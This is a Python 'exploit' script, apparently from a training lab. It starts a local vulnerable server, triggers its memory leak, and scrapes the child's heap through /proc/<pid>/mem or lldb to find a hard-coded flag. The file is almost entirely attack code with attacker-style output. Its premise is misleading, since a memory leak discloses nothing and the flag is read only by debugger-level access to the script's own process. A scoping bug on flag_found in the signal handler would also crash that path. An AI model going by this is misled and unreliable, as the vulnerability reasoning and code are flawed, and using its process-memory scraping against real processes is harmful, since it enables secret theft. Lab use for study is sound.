#!/usr/bin/env python3
"""
Memory Leak Exploit with Data Extraction
Demonstrates memory leak vulnerability and extracts leaked data

Note: Binary compiled without debug symbols (-g flag removed)
Uses process memory analysis instead of debug symbols
"""

import subprocess
import time
import sys
import os
import platform
import signal
import re

VICTIM_PROGRAM = "./compiled/vulnerable_server"

def read_process_memory(pid):
    """Read memory from the process to find leaked data"""
    try:
        if platform.system() == "Darwin":  # macOS
            # Use vmmap to find heap regions
            vmmap_cmd = f"vmmap {pid} | grep -E '(MALLOC|HEAP)'"
            result = subprocess.run(vmmap_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'MALLOC' in line or 'HEAP' in line:
                        # Extract memory range
                        parts = line.split()
                        if len(parts) >= 2:
                            addr_range = parts[0]
                            if '-' in addr_range:
                                start_addr, end_addr = addr_range.split('-')
                                start_addr = int(start_addr, 16)
                                end_addr = int(end_addr, 16)
                                
                                # Read memory using lldb
                                lldb_cmd = f"echo 'memory read --size 1 --count {min(4096, end_addr - start_addr)} --format x {hex(start_addr)}' | lldb -p {pid} --batch"
                                mem_result = subprocess.run(lldb_cmd, shell=True, capture_output=True, text=True)
                                if mem_result.returncode == 0:
                                    return mem_result.stdout
        else:  # Linux
            # Use /proc/pid/mem to read memory
            try:
                with open(f"/proc/{pid}/maps", "r") as f:
                    maps = f.read()
                
                # Find heap region
                heap_match = re.search(r'(\w+)-(\w+).*heap', maps)
                if heap_match:
                    start_addr = int(heap_match.group(1), 16)
                    end_addr = int(heap_match.group(2), 16)
                    
                    with open(f"/proc/{pid}/mem", "rb") as f:
                        f.seek(start_addr)
                        data = f.read(min(4096, end_addr - start_addr))
                        return data.hex()
            except (PermissionError, FileNotFoundError):
                pass
    except Exception as e:
        print(f"[!] Memory dump failed: {e}")
    
    return None

def search_for_flag_in_memory(memory_data):
    """Search for the flag in memory data"""
    if not memory_data:
        return None
    
    # Convert hex string to bytes if needed
    if isinstance(memory_data, str):
        try:
            # Extract hex values from lldb output
            hex_values = re.findall(r'0x[0-9a-fA-F]+', memory_data)
            if hex_values:
                # Convert hex values to bytes
                memory_bytes = b''
                for hex_val in hex_values:
                    memory_bytes += bytes.fromhex(hex_val[2:])  # Remove 0x prefix
            else:
                # Try to parse as plain hex
                memory_bytes = bytes.fromhex(memory_data.replace(' ', ''))
        except ValueError:
            memory_bytes = memory_data.encode()
    else:
        memory_bytes = memory_data
    
    # Search for flag pattern
    flag_pattern = b"FLAG: sybercode_are_the_best"
    flag_pos = memory_bytes.find(flag_pattern)
    
    if flag_pos != -1:
        # Extract surrounding context
        start = max(0, flag_pos - 20)
        end = min(len(memory_bytes), flag_pos + len(flag_pattern) + 20)
        context = memory_bytes[start:end]
        
        return {
            'flag': flag_pattern.decode(),
            'position': flag_pos,
            'context': context,
            'raw_data': memory_bytes
        }
    
    return None

def main():
    print("--- [ATTACKER] Memory Leak Exploit with Data Extraction Started ---")
    print("Target: Extract leaked flag from memory")
    print("Flag: FLAG: sybercode_are_the_best")
    print()
    
    try:
        # Start victim program as subprocess
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] ERROR: '{VICTIM_PROGRAM}' not found. Did you compile the C++ program?")
        print("Run: ./compile_linux.sh")
        sys.exit(1)
        
    victim_pid = p.pid
    print(f"[*] '{VICTIM_PROGRAM}' started. PID: {victim_pid}")
    
    # Show monitoring command
    print("\n" + "="*60)
    print("To monitor memory usage, open a NEW TERMINAL and run:")
    if platform.system() == "Darwin":  # macOS
        print(f"  watch -n 1 'ps -p {victim_pid} -o %mem,rss,vsz,command'")
    else:  # Linux
        print(f"  watch -n 1 'ps -p {victim_pid} -o %mem,rss,vsz,cmd'")
    print("="*60 + "\n")
        
    print("[*] Triggering memory leak... (Press CTRL+C to stop)")
    print("[*] Each leak writes 64 bytes containing the flag to memory")
    print("[*] Attempting to extract leaked data from memory...")
    print()
    
    leak_count = 0
    flag_found = False
    
    def signal_handler(sig, frame):
        print(f"\n[*] Stopping after {leak_count} leaks...")
        print(f"[*] Total memory leaked: {leak_count * 64 / 1024:.2f} KB")
        
        # Try to extract leaked data before terminating
        if not flag_found:
            print("[*] Attempting final memory dump...")
            memory_data = read_process_memory(victim_pid)
            if memory_data:
                flag_info = search_for_flag_in_memory(memory_data)
                if flag_info:
                    print(f"\n[+] FLAG FOUND IN MEMORY!")
                    print(f"[+] Flag: {flag_info['flag']}")
                    print(f"[+] Position: {flag_info['position']}")
                    print(f"[+] Context: {flag_info['context']}")
                    print(f"[+] Raw data preview: {flag_info['raw_data'][:100]}...")
                    flag_found = True
        
        print("[*] Terminating victim program...")
        p.terminate()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            # Send 'Enter' to trigger leak
            p.stdin.write(b'\n')
            p.stdin.flush()
            leak_count += 1
            
            # Show progress every 50 leaks
            if leak_count % 50 == 0:
                print(f"[*] {leak_count} leaks completed ({leak_count * 64 / 1024:.2f} KB leaked)")
                
            # After 100 leaks, try to extract leaked data
            if leak_count == 100 and not flag_found:
                print("\n[*] Attempting to extract leaked data from memory...")
                memory_data = read_process_memory(victim_pid)
                if memory_data:
                    print(f"[*] Memory dump successful, analyzing...")
                    flag_info = search_for_flag_in_memory(memory_data)
                    if flag_info:
                        print(f"\n[+] FLAG FOUND IN MEMORY!")
                        print(f"[+] Flag: {flag_info['flag']}")
                        print(f"[+] Position: {flag_info['position']}")
                        print(f"[+] Context: {flag_info['context']}")
                        print(f"[+] Raw data preview: {flag_info['raw_data'][:100]}...")
                        flag_found = True
                    else:
                        print("[-] Flag not found in memory dump, continuing...")
                else:
                    print("[-] Memory dump failed, continuing...")
                
            # After 200 leaks, show memory analysis info
            if leak_count == 200:
                print("\n" + "="*60)
                print("MEMORY ANALYSIS INFORMATION:")
                print("="*60)
                print(f"Process PID: {victim_pid}")
                print(f"Memory leaked: {leak_count * 64 / 1024:.2f} KB")
                print("Flag written to memory: FLAG: sybercode_are_the_best")
                print()
                print("To analyze the leaked data, you can:")
                print("1. Use GDB to attach to the process:")
                print(f"   gdb -p {victim_pid}")
                print("2. Use memory analysis tools:")
                if platform.system() == "Darwin":
                    print(f"   vmmap {victim_pid}")
                    print(f"   lldb -p {victim_pid}")
                else:
                    print(f"   cat /proc/{victim_pid}/maps")
                    print(f"   gdb -p {victim_pid}")
                print("3. Search for the flag pattern in memory")
                print("="*60 + "\n")
                
            time.sleep(0.01) # Small delay to not overwhelm the system
            
    except (KeyboardInterrupt, BrokenPipeError):
        print(f"\n[*] Stopping after {leak_count} leaks...")
        print(f"[*] Total memory leaked: {leak_count * 64 / 1024:.2f} KB")
        
        # Try to extract leaked data before terminating
        if not flag_found:
            print("[*] Attempting final memory dump...")
            memory_data = read_process_memory(victim_pid)
            if memory_data:
                flag_info = search_for_flag_in_memory(memory_data)
                if flag_info:
                    print(f"\n[+] FLAG FOUND IN MEMORY!")
                    print(f"[+] Flag: {flag_info['flag']}")
                    print(f"[+] Position: {flag_info['position']}")
                    print(f"[+] Context: {flag_info['context']}")
                    print(f"[+] Raw data preview: {flag_info['raw_data'][:100]}...")
                    flag_found = True
        
        print("[*] Terminating victim program...")
        p.terminate()
    
    print("\n" + "="*60)
    print("EXPLOIT SUMMARY:")
    print("="*60)
    print(f"✓ Memory leak vulnerability successfully triggered")
    print(f"✓ {leak_count} memory leaks performed")
    print(f"✓ {leak_count * 64 / 1024:.2f} KB of memory leaked")
    print(f"✓ Flag 'FLAG: sybercode_are_the_best' written to memory")
    if flag_found:
        print("✓ Flag successfully extracted from memory!")
    else:
        print("⚠ Flag not extracted (may require manual analysis)")
    print("✓ Process terminated")
    print()
    print("The leaked data contains the secret flag that was")
    print("written to memory but never freed, demonstrating")
    print("the memory leak vulnerability.")
    print("="*60)
    print("--- Exploit Completed ---")

if __name__ == "__main__":
    main()